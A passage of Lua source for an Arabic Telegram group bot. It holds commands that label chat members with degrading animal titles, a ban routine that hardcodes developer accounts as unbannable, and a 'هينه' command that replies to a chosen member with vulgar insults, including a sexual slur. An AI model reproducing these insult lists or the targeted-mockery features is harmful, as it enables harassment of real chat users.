send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Ownere:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
status  = '\n ✦┇تم تنزيل العضــو الحاته من الكروب\n ✦┇مشيي مو خوش حاتهه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل الحات' and Owner(msg) then
database:del(bot_id..'Ownerde:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ✦┇تم مسح جميع المطايه')
end
if text == ("تاك للحات") and Owner(msg) then
local list = database:smembers(bot_id..'Ownerde:User'..msg.chat_id_)
t = "\n ✦┇قائمه حات الكروب \nٴ┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الحات [@"..username.."]\n"
else
t = t..""..k.."» الحات `"..v.."`\n"
end
end
if #list == 0 then
t = " ✦┇مع الاسف لا يوجد حات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع الحات") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *✦┇تم تعطيل الرفع*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Ownerde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ✦┇تم رفع العضــو الحات في الكروب \n ✦┇تعال حبي الحات نطيني بوسه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل الحات")) and msg.reply_to_message_id_ and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Ownerde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
status  = '\n ✦┇تم تنزيل العضــو الحات من الكروب\n ✦┇مشيي مو خوش حات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == ("رفع جلب") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then   
function start_function(extra, result, success)
database:sadd(bot_id..'Glb:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇تم رفع العضو جلب في المجموعة 😭😹💞'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if (text == ("تنزيل جلب")) and msg.reply_to_message_id_ and Addictive(msg) then   
function start_function(extra, result, success)
database:srem(bot_id..'Glb:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇تم تنزيل العضو جلب في المجموعة 😭😹💞'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("رفع صخل") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then   
function start_function(extra, result, success)
database:sadd(bot_id..'Zgal:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇تم رفع العضو صخل في المجموعة 😭😹💞'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if (text == ("تنزيل صخل")) and msg.reply_to_message_id_ and Addictive(msg) then   
function start_function(extra, result, success)
database:srem(bot_id..'Zgal:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇تم تنزيل العضو صخل في المجموعة 😭😹💞'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل القروده' and Owner(msg) then
database:del(bot_id..'Motee:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ✦┇تم تنزيل جميع القروده بالكروب')
end
if text == ("تاك للقروده") and Owner(msg) then
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n ✦┇قائمة القروده الكروب \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» القرد [@"..username.."]\n"
else
t = t..""..k.."» القرد `"..v.."`\n"
end
end
if #list == 0 then
t = " ✦┇لا يوجد قرد"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *✦┇تم تعطيل الرفع*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
local  statuss  = '\n ✦┇تم رفع قرد في الكروب\n ✦┇تعال حبي استلم موزه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل قرد")) and msg.reply_to_message_id_ and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
status  = '\n ✦┇تم تنزيل قرد من الكروب\n ✦┇رجع موزه حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل الحصونه' and Owner(msg) then
database:del(bot_id..'Hors:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ✦┇تم تنزيل جميع الحصونه بالكروب')
end
if text == ("تاك للحصونه") and Owner(msg) then
local list = database:smembers(bot_id..'Hors:User'..msg.chat_id_)
t = "\n ✦┇قائمة الحصونه الكروب \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الحصان [@"..username.."]\n"
else
t = t..""..k.."» الحصان `"..v.."`\n"
end
end
if #list == 0 then
t = " ✦┇لا يوجد حصان"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع حصان") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *✦┇تم تعطيل الرفع*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Hors:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
local  statuss  = '\n ✦┇تم رفع حصان في الكروب\n ✦┇تعال حبي احطلك سرج وركبك فرني فره حلوه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل حصان")) and msg.reply_to_message_id_ and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Hors:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
status  = '\n ✦┇تم تنزيل حصان من الكروب\n ✦┇رجع السرج حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل البقرات' and Owner(msg) then
database:del(bot_id..'Bakra:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ✦┇تم تنزيل جميع البقرات بالكروب')
end
if text == ("تاك للبقرات") and Owner(msg) then
local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
t = "\n ✦┇قائمة البقرات الكروب \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» البقره [@"..username.."]\n"
else
t = t..""..k.."» البقره "..v.."\n"
end
end
if #list == 0 then
t = " ✦┇لا يوجد البقره"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *✦┇تم تعطيل الرفع*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
local  statuss  = '\n ✦┇تم رفع بقره في الكروب\n ✦┇ها يالهايشه تع احلبك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل بقره")) and msg.reply_to_message_id_ and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
status  = '\n ✦┇تم تنزيل بقره من الكروب\n ✦┇تعال هاك حليب مالتك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل الطليان' and Owner(msg) then
database:del(bot_id..'Tele:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ✦┇تم تنزيل جميع طليان بالكروب')
end
if text == ("تاك للطليان") and Owner(msg) then
local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
t = "\n ✦┇قائمة الطليان الكروب \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الطلي[@"..username.."]\n"
else
t = t..""..k.."» الطلي "..v.."\n"
end
end
if #list == 0 then
t = " ✦┇لا يوجد طلي"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع طلي") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *✦┇تم تعطيل الرفع*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
local  statuss  = '\n ✦┇تم رفع الطلي في الكروب\n ✦┇طلع برا ابو البعرور الوصخ'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل طلي")) and msg.reply_to_message_id_ and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
status  = '\n ✦┇تم تنزيل الطلي من الكروب\n ✦┇هاك اخذ بعرور'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل جريذيه' and Owner(msg) then
database:del(bot_id..'Jred:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ✦┇تم تنزيل جميع جريزي')
end
if text == ("تاك للجريذيه") and Owner(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n ✦┇قائمة الجريذيه الكروب \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الجريذي [@"..username.."]\n"
else
t = t..""..k.."» الجريذي "..v.."\n"
end
end
if #list == 0 then
t = " ✦┇لا يوجد جريذي"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع جريذي") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *✦┇تم تعطيل الرفع*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
local  statuss  = '\n ✦┇تم رفع جريذي في الكروب\n ✦┇خايس ريحتك موتتنه روح سبح يع'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل جريذي")) and msg.reply_to_message_id_ and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..')'
status  = '\n ✦┇تم تنزيل جريذي من الكروب\n ✦┇هاك ليفه اسبح'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✦┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
function Function_Neverland(extra, result, success)
if result.sender_user_id_ == tonumber(1391769117) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if result.id_ == tonumber(1799741) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1917848) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.sender_user_id_ == tonumber(2074461232) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if result.sender_user_id_ == tonumber(1466244479) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"*✦┇ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !*") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"*✦┇البوت ليس ادمن يرجى ترقيتي !*") 
return false  
end
database:sadd(bot_id.."Neverland:Ban:User"..msg.chat_id_, result.sender_user_id_)
Kick_Group(result.chat_id_, result.sender_user_id_) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local UserName = (data.username_ or "TEAM_Neverland")
local NameUserr = "\n*✦┇المستخدم ↜* ["..data.first_name_.."](T.me/"..UserName..")\n"
local keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'الغاء الامر',callback_data=msg.sender_user_id_..'/unban'..result.sender_user_id_}
}
}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(NameUserr.."*✦┇تم حظره من المجموعه*").."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text == "غازلني" or text == "غازلوني" then
local texting = {" مٛعقولةهَ ڪِٰݪ الاغاني٘ ټقصِډك ؟.","ابتسم لْـۆ لمحت ࢪسالۿ مـڼـڱ.","حِبنيٰ هِۅايٰ لتخݪي مڪِان شِۅيٰ ݪغيࢪك.","تـ؏ـال نتَزقنب چايہ سـوا رحمـۃ لـ ﭑللۿ.","ﺎࢦلۿمہ‌َٖ أنيَہ ﺎغاݛ عࢦيك فَجعࢦه بِعينہ‌َٖ غغيريہ‌َٖ بَݛيعصيہَ.","﮼ بينيَ وبين عَيونك ﭑغنيۿہ‌َٖ.",": ڪٰٖݪ ابتسَاماتِيَہٰ مَنہٰ افڪٰٖࢪ بيڪٰٖہ‌َٖ.","ابقۿہ اشتاڪݪك واحبك.  ۅانت مٛتډࢪي.","هوۿ ﭑڪَۅ حٖ٘ب ݪۉ ڪݪهذا ۉهمہ‌َٖ"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
return false
end
if text == "حفزني" or text == "حفزهم" then
local texting = {" يبدأ الإنسان طريق المعرفة بقراءة الكتب ثم يرتقى فيقرأ الناس ثم يرتقى فيقرأ الحياة ثم يرتقى فيقرأ الموت..","اذا أردت أن تفعل شيئا ستبحث بكل تأكيد عن الطريقة المناسبة.. اما اذا لم ترد فعله فستبحث عن عذر! - جيم روهن.","النجاح غالبا ما يأتي للذين يجرؤون للقيام بالأعمال، ونادرا ما يأتي للخجولين الذين يخافون من النتائج!.","الطريقة الصحيحة لتبدأ هي أن تتوقف عن الحديث وتبدأ الآن! - والت ديزني.","تتعلم من الفشل أكثر من النجاح.. لا تدعه يوقفك.. الفشل يبني الشخصية! -.","لا أحد يبدأ من القمة! عليك أن تشق طريقك اليها! -.","قد ينكسر المرء، لكنه لا ينهزم أبدا فغذا يوم آخر! - أرنست همينغوي.","سأصير يوما ما، ما أريد بإذن الله ."}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
return false
end
if text == "هينه" or text == "هينها" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
heen = {
"- حبيبي علاج الجاهل التجاهل ."
,"- مالي خلك زبايل التلي . "
,"- كرامتك صارت بزبل פَــبي ."
,"- مو صوجك صوج الكواد الزمك جهاز ."
,"- لفارغ استجن . "
,"- ڪِݪك واحد لوكي كس ."
,"- ملطلط دي ."
};
sendheen = heen[math.random(#heen)]
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.reply_to_message_id_,sendheen)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^حظر @(.*)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^حظر @(.*)$")
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✦┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
function Function_Neverland(extra, result, success)
if result.id_ then
if result.id_ == tonumber(1466244479) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1799741) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1917848) then
